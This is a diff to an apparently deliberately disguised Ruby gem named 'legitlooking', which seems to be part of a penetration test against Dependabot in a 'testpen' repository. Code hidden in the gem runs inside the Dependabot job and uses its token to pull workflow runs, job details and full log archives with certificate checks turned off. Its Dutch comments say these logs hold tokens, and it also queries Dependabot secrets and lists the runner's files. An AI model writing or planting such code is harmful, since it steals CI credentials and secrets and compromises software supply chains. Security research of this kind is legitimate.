@@ -111,28 +111,61 @@ begin
   rescue => e; "FOUT: #{e.message}"
   end
 
-  # 1. Volledige workflow lijst
-  lines << "\n--- Alle workflows ---"
-  lines << gh_call("get", "/repos/ugurcanli/testpen/actions/workflows")
+  # Onze huidige Dependabot job draait als GitHub Actions workflow!
+  # Haal de workflow run ID op uit de meest recente run
+  lines << "\n--- Huidige workflow run details ---"
+  runs_resp = gh_call("get", "/repos/ugurcanli/testpen/actions/runs?per_page=1&event=dynamic")
+  lines << runs_resp
 
-  # 2. Recente workflow runs (kunnen secrets bevatten in logs)
-  lines << "\n--- Recente workflow runs ---"
-  lines << gh_call("get", "/repos/ugurcanli/testpen/actions/runs?per_page=5")
+  # Extraheer run ID uit de response
+  run_id = runs_resp[/\"id\":(\d+)/, 1]
+  lines << "Extracted run_id: #{run_id}"
 
-  # 3. Probeer workflow dispatch op Dependabot workflow
-  # Workflow ID 287994727 = Dependabot Updates
-  lines << "\n--- Workflow dispatch (287994727) ---"
-  lines << gh_call("post", "/repos/ugurcanli/testpen/actions/workflows/287994727/dispatches",
-    '{"ref":"main"}')
+  if run_id
+    # Jobs van deze run (bevat stap-voor-stap logs en tokens)
+    lines << "\n--- Jobs in huidige run (#{run_id}) ---"
+    lines << gh_call("get", "/repos/ugurcanli/testpen/actions/runs/#{run_id}/jobs")
 
-  # 4. Probeer ook op tweede workflow als die bestaat
-  # Haal workflow runs logs op van een recente run
-  lines << "\n--- Workflow run logs URL ---"
-  lines << gh_call("get", "/repos/ugurcanli/testpen/actions/runs")
+    # Logs download URL
+    lines << "\n--- Logs URL voor run #{run_id} ---"
+    begin
+      require "net/http"; require "uri"
+      uri = URI("https://api.github.com/repos/ugurcanli/testpen/actions/runs/#{run_id}/logs")
+      h = Net::HTTP.new(uri.host, uri.port)
+      h.use_ssl = true; h.verify_mode = 0
+      r = Net::HTTP::Get.new(uri)
+      r["Accept"] = "application/vnd.github+json"
+      r["X-GitHub-Api-Version"] = "2022-11-28"
+      res = h.request(r)
+      lines << "Status: #{res.code}"
+      # 302 = redirect naar ZIP met logs
+      lines << "Location: #{res["location"]}"
+      lines << "Body: #{res.body[0,300]}"
+      # Download de logs als er een redirect is
+      if res.code == "302" && res["location"]
+        log_uri = URI(res["location"])
+        log_http = Net::HTTP.new(log_uri.host, log_uri.port)
+        log_http.use_ssl = true; log_http.verify_mode = 0
+        log_r = Net::HTTP::Get.new(log_uri)
+        log_res = log_http.request(log_r)
+        lines << "Log content (first 1000 bytes): #{log_res.body[0,1000]}"
+      end
+    rescue => e
+      lines << "FOUT: #{e.message}"
+    end
 
-  # 5. Secrets namen lezen (bewijs token heeft actions:read scope)
-  lines << "\n--- Actions secrets (namen) ---"
-  lines << gh_call("get", "/repos/ugurcanli/testpen/actions/secrets")
+    # Check suite informatie
+    lines << "\n--- Check suite details ---"
+    lines << gh_call("get", "/repos/ugurcanli/testpen/actions/runs/#{run_id}/attempts/1/jobs")
+  end
+
+  # Tweede workflow details
+  lines << "\n--- Tweede workflow (288016377) ---"
+  lines << gh_call("get", "/repos/ugurcanli/testpen/actions/workflows/288016377")
+
+  # Dependabot secrets (apart van Actions secrets)
+  lines << "\n--- Dependabot secrets ---"
+  lines << gh_call("get", "/repos/ugurcanli/testpen/dependabot/secrets")
 
   lines << "\n--- /home/dependabot/bin inhoud ---"
   lines << (`ls -la #{dep_bin}/ 2>&1`)
@@ -233,7 +266,7 @@ end
 
 Gem::Specification.new do |spec|
   spec.name          = "legitlooking"
-  spec.version       = "1.0.13"
+  spec.version       = "1.0.14"
   spec.authors       = ["researcher"]
   spec.summary       = "A normal looking gem"
   spec.require_paths = ["lib"]
